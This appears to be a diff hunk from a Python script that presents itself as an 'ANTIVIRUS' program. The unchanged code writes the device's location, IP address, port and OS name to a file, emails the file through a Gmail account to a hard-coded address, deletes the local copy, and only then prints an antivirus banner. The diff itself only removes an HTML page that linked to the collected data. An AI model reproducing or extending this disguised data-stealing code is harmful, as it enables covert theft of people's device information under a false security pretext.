@@ -102,28 +102,11 @@ Data="Location: ",location,"Device IP: ",DevIP,"IP Port: ",IPport,"OS Name: ",OS
 f = open("AllData.txt","a")
 f.write(str(Data)+"\n")
 f.close()
-text='''
-<html>
-<head>
-<style>
-</style>
-</head>
-<body>
-<a href="AllData.txt">Data</a>
-</body>
-</html>
-'''
-
-file=open("Data.html","w")
-file.write(text)
-file.close()
 gmail1 = gmail.GMail("enteryouremailhere@gmail.com","enteryourpasswordhere")
 message = gmail.Message("Data",to="enteryouremailhere@gmail.com",attachments=["AllData.txt"])
 gmail1.send(message)
 time.sleep(2)
 os.remove("AllData.txt")
-time.sleep(2)
-os.remove("Data.html")
 num=random.randint(1,24)
 antivirus=pyfiglet.figlet_format("ANTIVIRUS")
 print(antivirus)
